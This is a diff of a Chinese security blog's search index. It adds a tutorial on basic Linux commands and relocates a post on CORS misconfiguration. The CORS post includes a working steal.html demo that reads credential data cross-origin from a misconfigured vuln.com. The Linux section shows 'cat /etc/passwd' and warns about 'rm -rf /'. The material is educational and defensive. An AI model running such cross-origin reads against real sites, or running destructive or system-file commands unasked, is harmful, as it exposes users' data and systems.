@@ -1,6 +1,63 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CORS</title>
+    <url>/2021/02/24/CORS/</url>
+    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><hr>
+<h3 id="0x00-浏览器的同源策略"><a href="#0x00-浏览器的同源策略" class="headerlink" title="0x00 浏览器的同源策略"></a>0x00 浏览器的同源策略</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>同源策略 (Same Origin Policy)</strong>,同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读取对方的资源。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但随着Web应用的发展，网站由于自身业务的其需求，需要实现一些跨域功能，能让不用域的页面之间能互相访问各自页面的内容。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;浏览器的同源目的是为了保证用户信息的安全，防止恶意的网站窃取数据。如果王爷之间不满足同源要求，将不能：</p>
+<blockquote>
+<ol>
+<li>共享Cookie,LocalStorage,IndexDB  </li>
+<li>获取DOM  </li>
+<li>AJAX请求不能发送</li>
+</ol>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01-CORS介绍"><a href="#0x01-CORS介绍" class="headerlink" title="0x01 CORS介绍"></a>0x01 CORS介绍</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__CORS，跨域资源共享（Cross-origin resource sharing）__，是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CORS本质上就是使用各种头信息让浏览器与服务器之间进行交流，上面提到的名单就是用下面的http头字段来控制的： </p>
+<p><img src="/2021/02/24/CORS/1.jpg"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中比较重要的相应头为：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:<span class="regexp">//</span>a.com  	<span class="regexp">//</span>服务端接受来自http:<span class="regexp">//</span>a.com的跨域请求    </span><br><span class="line">Access-Control-Allow-Credentials: true  	<span class="regexp">//</span>表示是否允许发送Cookie，true即发送cookie</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0×02-CORS漏洞的攻击流程"><a href="#0×02-CORS漏洞的攻击流程" class="headerlink" title="0×02 CORS漏洞的攻击流程"></a>0×02 CORS漏洞的攻击流程</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;假设用户登陆一个含有CORS配置网站<code>vuln.com</code>，同时又访问了攻击者提供的一个链接<code>evil.com</code>。<code>evil.com</code>的网站向<code>vuln.com</code>这个网站发起请求获取敏感数据，浏览器能否接收信息取决于<code>vuln.com</code>的配置。如果<code>vuln.com</code>配置了<code>Access-Control-Allow-Origin</code>头且为预期，那么允许接收，否则浏览器会因为同源策略而不接收。</p>
+<h3 id="0×03-CORS漏洞演示"><a href="#0×03-CORS漏洞演示" class="headerlink" title="0×03 CORS漏洞演示"></a>0×03 CORS漏洞演示</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先修改host文件，加上</p>
+<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span> www.vuln.com </span><br><span class="line"><span class="number">127.0.0.1</span> www.evil.com</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样访问<a href="http://www.vuln.com就相当于服务端.服务端新建a.php./">http://www.vuln.com就相当于服务端。服务端新建a.php。</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;username: admin; password:123456&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果访问<code>http://www.vuln.com/a.php</code>，会正常输出<code>username: admin; password:123456</code></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着在hacker端构造steal.html：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- www.evil.com/steal.html  --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello I evil page. <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">loadXMLDoc</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">xhr.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span>) <span class="comment">//if receive xhr response</span></span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> datas=xhr.responseText;</span></span><br><span class="line">        alert(datas);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript"><span class="comment">//request vuln page</span></span></span><br><span class="line"><span class="javascript">xhr.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://www.vuln.com/a.php&quot;</span>,<span class="string">&quot;true&quot;</span>) </span></span><br><span class="line">xhr.send();</span><br><span class="line">&#125;</span><br><span class="line">loadXMLDoc();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后打开<code>http://www.evil.com/steal.html</code>，html代码的意思是通过XMLHttpRequest访问&nbsp;&nbsp;<u>vuln.com/a.php</u>，然后将获取到的内容alert出来。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是根据同源策略，这是不允许的，结果也和我想的一样：</p>
+<p><img src="/2021/02/24/CORS/2.jpg"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来改一下a.php：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Access-Control-Allow-Origin:http://www.evil.com&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;username: admin; password:123456&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再次访问<code>http://www.evil.com/steal.html</code>，发现可以正常alert了，成功实现了跨域资源的请求。</p>
+<p><img src="/2021/02/24/CORS/3.jpg"></p>
+<h3 id="0×04-CORS漏洞防范"><a href="#0×04-CORS漏洞防范" class="headerlink" title="0×04 CORS漏洞防范"></a>0×04 CORS漏洞防范</h3><ul>
+<li>不要盲目反射Origin头</li>
+<li>严格校验Origin头，避免出现权限泄露</li>
+<li>不要配置Access-Control-Allow-Origin: null</li>
+<li>HTTPS网站不要信任HTTP域</li>
+<li>不要信任全部自身子域，减少攻击面</li>
+<li>不要配置Origin:*和Credentials: true</li>
+<li>增加Vary: Origin头</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2020-1472 Netlogon域权限提升漏洞</title>
     <url>/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="CVE-2020-1472-Netlogon域权限提升漏洞"><a href="#CVE-2020-1472-Netlogon域权限提升漏洞" class="headerlink" title="CVE-2020-1472 Netlogon域权限提升漏洞"></a>CVE-2020-1472 Netlogon域权限提升漏洞</h1><h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-漏洞信息"><a href="#0x00-漏洞信息" class="headerlink" title="0x00 漏洞信息"></a>0x00 漏洞信息</h3><p><strong>漏洞编号：</strong>CVE-2020-1472</p>
@@ -73,68 +130,12 @@
 <p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/7.png"></p>
 ]]></content>
       <categories>
+        <category>漏洞复现</category>
         <category>渗透测试</category>
       </categories>
       <tags>
         <tag>渗透测试</tag>
         <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CORS</title>
-    <url>/2021/02/24/CORS/</url>
-    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><hr>
-<h3 id="0x00-浏览器的同源策略"><a href="#0x00-浏览器的同源策略" class="headerlink" title="0x00 浏览器的同源策略"></a>0x00 浏览器的同源策略</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>同源策略 (Same Origin Policy)</strong>,同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读取对方的资源。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但随着Web应用的发展，网站由于自身业务的其需求，需要实现一些跨域功能，能让不用域的页面之间能互相访问各自页面的内容。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;浏览器的同源目的是为了保证用户信息的安全，防止恶意的网站窃取数据。如果王爷之间不满足同源要求，将不能：</p>
-<blockquote>
-<ol>
-<li>共享Cookie,LocalStorage,IndexDB  </li>
-<li>获取DOM  </li>
-<li>AJAX请求不能发送</li>
-</ol>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01-CORS介绍"><a href="#0x01-CORS介绍" class="headerlink" title="0x01 CORS介绍"></a>0x01 CORS介绍</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__CORS，跨域资源共享（Cross-origin resource sharing）__，是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CORS本质上就是使用各种头信息让浏览器与服务器之间进行交流，上面提到的名单就是用下面的http头字段来控制的： </p>
-<p><img src="/2021/02/24/CORS/1.jpg"></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中比较重要的相应头为：</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:<span class="regexp">//</span>a.com  	<span class="regexp">//</span>服务端接受来自http:<span class="regexp">//</span>a.com的跨域请求    </span><br><span class="line">Access-Control-Allow-Credentials: true  	<span class="regexp">//</span>表示是否允许发送Cookie，true即发送cookie</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="0×02-CORS漏洞的攻击流程"><a href="#0×02-CORS漏洞的攻击流程" class="headerlink" title="0×02 CORS漏洞的攻击流程"></a>0×02 CORS漏洞的攻击流程</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;假设用户登陆一个含有CORS配置网站<code>vuln.com</code>，同时又访问了攻击者提供的一个链接<code>evil.com</code>。<code>evil.com</code>的网站向<code>vuln.com</code>这个网站发起请求获取敏感数据，浏览器能否接收信息取决于<code>vuln.com</code>的配置。如果<code>vuln.com</code>配置了<code>Access-Control-Allow-Origin</code>头且为预期，那么允许接收，否则浏览器会因为同源策略而不接收。</p>
-<h3 id="0×03-CORS漏洞演示"><a href="#0×03-CORS漏洞演示" class="headerlink" title="0×03 CORS漏洞演示"></a>0×03 CORS漏洞演示</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先修改host文件，加上</p>
-<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span> www.vuln.com </span><br><span class="line"><span class="number">127.0.0.1</span> www.evil.com</span><br></pre></td></tr></table></figure>
-
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样访问<a href="http://www.vuln.com就相当于服务端.服务端新建a.php./">http://www.vuln.com就相当于服务端。服务端新建a.php。</a></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;username: admin; password:123456&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果访问<code>http://www.vuln.com/a.php</code>，会正常输出<code>username: admin; password:123456</code></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着在hacker端构造steal.html：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- www.evil.com/steal.html  --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello I evil page. <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">loadXMLDoc</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">xhr.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span>) <span class="comment">//if receive xhr response</span></span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> datas=xhr.responseText;</span></span><br><span class="line">        alert(datas);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript"><span class="comment">//request vuln page</span></span></span><br><span class="line"><span class="javascript">xhr.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://www.vuln.com/a.php&quot;</span>,<span class="string">&quot;true&quot;</span>) </span></span><br><span class="line">xhr.send();</span><br><span class="line">&#125;</span><br><span class="line">loadXMLDoc();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后打开<code>http://www.evil.com/steal.html</code>，html代码的意思是通过XMLHttpRequest访问&nbsp;&nbsp;<u>vuln.com/a.php</u>，然后将获取到的内容alert出来。</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是根据同源策略，这是不允许的，结果也和我想的一样：</p>
-<p><img src="/2021/02/24/CORS/2.jpg"></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来改一下a.php：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Access-Control-Allow-Origin:http://www.evil.com&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;username: admin; password:123456&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>再次访问<code>http://www.evil.com/steal.html</code>，发现可以正常alert了，成功实现了跨域资源的请求。</p>
-<p><img src="/2021/02/24/CORS/3.jpg"></p>
-<h3 id="0×04-CORS漏洞防范"><a href="#0×04-CORS漏洞防范" class="headerlink" title="0×04 CORS漏洞防范"></a>0×04 CORS漏洞防范</h3><ul>
-<li>不要盲目反射Origin头</li>
-<li>严格校验Origin头，避免出现权限泄露</li>
-<li>不要配置Access-Control-Allow-Origin: null</li>
-<li>HTTPS网站不要信任HTTP域</li>
-<li>不要信任全部自身子域，减少攻击面</li>
-<li>不要配置Origin:*和Credentials: true</li>
-<li>增加Vary: Origin头</li>
-</ul>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -380,6 +381,347 @@ M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">�
       <tags>
         <tag>渗透测试</tag>
         <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux基础命令-1</title>
+    <url>/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/</url>
+    <content><![CDATA[<h1 id="Linux基础命令（1）"><a href="#Linux基础命令（1）" class="headerlink" title="Linux基础命令（1）"></a>Linux基础命令（1）</h1><h5 id="成殇Orz"><a href="#成殇Orz" class="headerlink" title="成殇Orz"></a>成殇Orz</h5><h3 id="0x01-Linux介绍"><a href="#0x01-Linux介绍" class="headerlink" title="0x01 Linux介绍"></a>0x01 Linux介绍</h3><p>Linux，全称GNU/Linux，是一种免费使用和自由传播的类UNIX操作系统，其内核由林纳斯·本纳第克特·托瓦兹于1991年10月5日首次发布，它主要受到Minix和Unix思想的启发，是一个基于POSIX和Unix的多用户、多任务、支持多线程和多CPU的操作系统。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持32位和64位硬件。严格来讲，Linux这个词本身只表示Linux内核，但实际上人们已经习惯了用Linux来形容整个基于Linux内核，并且使用GNU 工程各种工具和数据库的操作系统。</p>
+<span id="more"></span>
+
+<h3 id="0x02-Linux常用命令"><a href="#0x02-Linux常用命令" class="headerlink" title="0x02 Linux常用命令"></a>0x02 Linux常用命令</h3><h4 id="2-1-mkdir"><a href="#2-1-mkdir" class="headerlink" title="2.1 mkdir"></a>2.1 mkdir</h4><p><code>mkdir</code>命令用于创建目录。</p>
+<p>用法：<code>mkdir [选项] [目录名]</code></p>
+<p>参数：<code>-p</code> 创建多级目录，如果目录名称不存在，就新建一个。</p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir CS</span><br><span class="line">mkdir CS1 CS2</span><br><span class="line">mkdir -p CS3/CS4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/1.png"></p>
+<h4 id="2-2-ls"><a href="#2-2-ls" class="headerlink" title="2.2 ls"></a>2.2 ls</h4><p>命令用于显示指定工作目录下之内容（列出指定目录所含之文件及子目录)，<code>ls</code>命令的输出信息可以进行彩色加亮显示，以区分不同类型的文件。</p>
+<p>用法：<code>ls [选项] [目录]</code></p>
+<p>参数：</p>
+<ul>
+<li><code>-a</code> 显示所有文件及目录 (<strong>.</strong> 开头的隐藏文件也会列出)</li>
+<li><code>-l</code> 除文件名称外，也将文件型态、权限、拥有者、文件大小等资讯详细列出</li>
+<li><code>-h</code> 以容易理解的格式列出文件大小</li>
+</ul>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">ls -l</span><br><span class="line">ls -a CS3</span><br><span class="line">ls -al CS3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/2.png"></p>
+<h4 id="2-3-pwd-命令"><a href="#2-3-pwd-命令" class="headerlink" title="2.3 pwd 命令"></a>2.3 pwd 命令</h4><p><code>pwd</code>命令以绝对路径的方式显示用户当前工作目录。命令将当前目录的全路径名称（从根目录）写入标准输出。全部目录使用/分隔。第一个/表示根目录，最后一个目录是当前目录。执行pwd命令得知目前所在的工作目录的绝对路径名称。</p>
+<p>用法：<code>pwd</code></p>
+<p>案例：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/3.png"></p>
+<h4 id="2-4-cd-命令"><a href="#2-4-cd-命令" class="headerlink" title="2.4 cd 命令"></a>2.4 cd 命令</h4><p><code>cd</code>命令用于切换当前工作目录。</p>
+<p>用法：<code>cd [目录]</code></p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> CS</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/4.png"></p>
+<p>用法：<code>cd [绝对路径]</code></p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/CS3/CS4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/5.png"></p>
+<p>用法： <code>.</code>代表当前目录，<code>..</code>代表上一级目录，<code>cd ~</code>用于切换至登录用户家目录。<code>cd -</code>用于回到上一个目录。</p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> .</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">cd</span> -</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/6.png"></p>
+<h4 id="2-5-touch-命令"><a href="#2-5-touch-命令" class="headerlink" title="2.5 touch 命令"></a>2.5 touch 命令</h4><p><code>touch</code>命令用于创建一个空白的新文件，如果同名文件已存在，则修改其时间属性。</p>
+<p>用法： <code>touch [选项] [文件名]</code></p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">touch SS</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/7.png"></p>
+<h4 id="2-6-cp-命令"><a href="#2-6-cp-命令" class="headerlink" title="2.6 cp 命令"></a>2.6 cp 命令</h4><p><code>cp</code>命令主要用于复制文件或目录。</p>
+<p>用法：<code>cp [选项] [源文件] [目录]</code></p>
+<p>参数：</p>
+<ul>
+<li><code>-r</code>：若给出的源文件是一个目录文件，此时将复制该目录下所有的子目录和文件。（递归）</li>
+<li><code>-p</code>：除复制文件的内容外，还把修改时间和访问权限也复制到新文件中。(保持默认属性)</li>
+</ul>
+<p>案例；</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp SS CS</span><br><span class="line">cp /root/<span class="built_in">test</span>/CS/SS CS1</span><br><span class="line">cp /root/<span class="built_in">test</span>/CS1/SS /root/<span class="built_in">test</span>/CS2</span><br><span class="line">cp -r CS2 CS3/CS4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/8.png"></p>
+<h4 id="2-7-mv-命令"><a href="#2-7-mv-命令" class="headerlink" title="2.7 mv 命令"></a>2.7 mv 命令</h4><p><code>mv</code>命令用来为文件或目录改名、或将文件或目录移入其它位置。</p>
+<p>用法：<code>mv [选项] [源文件/源目录] [目录]</code> 参数：</p>
+<ul>
+<li><strong>-f</strong>: 如果指定移动的源目录或文件与目标的目录或文件同名，不会询问，直接覆盖旧文件。（直接覆盖不询问）</li>
+<li><strong>-n</strong>: 不要覆盖任何已存在的文件或目录。(不覆盖已存在的文件)</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv SS S1</span><br><span class="line">mv S1 CS</span><br><span class="line">mv CS CS1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/9.png"></p>
+<p><code>mv</code>命令的另一种用法是将文件剪切。</p>
+<p><code>mv 路径/文件名 路径、文件名</code></p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">mv</span> <span class="number">1</span>.txt /root</span><br><span class="line"><span class="attribute">mv</span> <span class="number">2</span>.txt /root/<span class="number">3</span>.txt</span><br><span class="line"><span class="attribute">mv</span> /root/<span class="number">2</span>.txt /root/<span class="number">1</span>/<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-8-rm命令"><a href="#2-8-rm命令" class="headerlink" title="2.8 rm命令"></a>2.8 rm命令</h4><p><code>rm</code>命令用于删除文件或者目录。</p>
+<p>用法：<code>rm [选项] [文件\目录]</code></p>
+<ul>
+<li>-i 删除前逐一询问确认。</li>
+<li>-f 即使原档案属性设为唯读，亦直接删除，无需逐一确认。</li>
+<li>-r 将目录及以下之档案亦逐一删除。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm ss</span><br><span class="line">rm -f SS</span><br><span class="line">rm CS1/CS/      <span class="comment">#删除farmsec1/farmsec/目录下的所有文件</span></span><br><span class="line">rm -r farmsec1</span><br><span class="line">rm -rf farmsec2</span><br><span class="line">rm -rf /root/farmsec3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/10.png"></p>
+<h6 id="注意：rm-rf是一条危险的命令，代表递归删除某文件，如rm-rf-是递归删除根目录下的所有目录和文件，该命令不会询问，一旦执行系统将崩溃。"><a href="#注意：rm-rf是一条危险的命令，代表递归删除某文件，如rm-rf-是递归删除根目录下的所有目录和文件，该命令不会询问，一旦执行系统将崩溃。" class="headerlink" title="注意：rm -rf是一条危险的命令，代表递归删除某文件，如rm -rf /是递归删除根目录下的所有目录和文件，该命令不会询问，一旦执行系统将崩溃。"></a>注意：<code>rm -rf</code>是一条危险的命令，代表递归删除某文件，如<code>rm -rf /</code>是递归删除根目录下的所有目录和文件，该命令不会询问，一旦执行系统将崩溃。</h6><h3 id="0x03-文本相关命令"><a href="#0x03-文本相关命令" class="headerlink" title="0x03 文本相关命令"></a>0x03 文本相关命令</h3><h4 id="3-1-cat-命令"><a href="#3-1-cat-命令" class="headerlink" title="3.1 cat 命令"></a>3.1 cat 命令</h4><p><code>cat</code>命令用于打开文件查看文件内容。</p>
+<p>用法：<code>cat [选项] [文件]</code></p>
+<p><code>cat -v [文件]</code>               #加入参数-v后再查看</p>
+<p>参数：</p>
+<ul>
+<li>-v：除了 LFD(换行) 和 TAB 之外所有控制符，用 ^ 和 M- 显示。</li>
+</ul>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/11.png"></p>
+<h4 id="3-2-echo-命令"><a href="#3-2-echo-命令" class="headerlink" title="3.2 echo 命令"></a>3.2 echo 命令</h4><p><code>echo</code>命令用于输出指定内容。</p>
+<p>用法：<code>echo &#39;[文本]&#39;</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/12.png"></p>
+<p>利用<code>&gt;&gt;</code>和<code>&gt;</code>也可以将输出内容写入到文件中。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;     <span class="comment">#为覆盖</span></span><br><span class="line">&gt;&gt;    <span class="comment">#为追加</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/13.png"></p>
+<p>使用<code>&gt;&gt;</code>和<code>&gt;</code>可以将命令的输出结果保存于文件中。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd &gt;1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/14.png"></p>
+<h3 id="3-3-more-命令"><a href="#3-3-more-命令" class="headerlink" title="3.3 more 命令"></a>3.3 more 命令</h3><p><code>more</code> 命令类似 <code>cat</code> ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是，按空格键<code>Space</code>就往下一页显示，按<code>Enier</code>键显示文本的下一行内容,按 <code>b</code>键就会往回(back)一页显示，按<code>q</code>键退出。</p>
